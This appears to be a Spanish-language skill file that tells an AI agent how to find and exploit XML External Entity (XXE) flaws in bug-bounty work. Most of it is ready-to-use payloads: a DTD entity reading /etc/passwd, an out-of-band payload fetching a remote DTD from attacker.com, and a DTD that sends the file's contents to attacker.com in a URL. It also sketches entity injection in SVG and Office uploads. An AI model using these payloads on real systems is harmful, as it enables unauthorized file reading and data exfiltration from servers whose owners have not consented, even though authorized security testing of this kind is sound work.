---
name: bug-bounty-xxe
description: Identificación y explotación de vulnerabilidades XML External Entity (XXE). Incluye lectura de archivos locales (/etc/passwd), SSRF via XXE, ataques OOB (Out-Of-Band) y bypass de analizadores XML.
---

# Skill: XML External Entity Attack (XXE)

Esta habilidad capacita al agente para auditar aplicaciones web y APIs que procesan documentos XML (SOAP, SAML, SVG, Office OpenXML `.docx`/`.xlsx`, RSS feeds), identificando vulnerabilidades de entidad externa XML (XXE).

## 📌 Vectores Principales y Diagnóstico

### 1. Inyección de Entidades Internas (Lectura Local de Archivos)
- Modificar el DTD del payload XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

### 2. XXE Out-Of-Band (OOB Exfiltration via External DTD)
- Cuando la respuesta no devuelve el contenido del elemento inyectado:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe; ]>
<stockCheck>
  <productId>1</productId>
</stockCheck>
```
- Contenido de `evil.dtd` remoto:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### 3. XXE en Archivos Subidos (SVG, Office OpenXML)
- **Imágenes SVG**: Inyectar DTD en el encabezado de un SVG procesado por el servidor.
- **Archivos `.xlsx` / `.docx`**: Descomprimir el archivo zip, editar `[Content_Types].xml` o `xl/workbook.xml` inyectando la entidad externa y volver a comprimir.

---

## 📚 Casos Destacados de HackerOne Reports (`reddelexc/hackerone-reports`)

Consulta la lista de reportes con mayor puntaje de HackerOne en:
[xxe-reports-matrix.md](file:///C:/Users/logir/.gemini/antigravity-ide/scratch/bug-bounty-skills/skills/bug-bounty-xxe/references/xxe-reports-matrix.md)
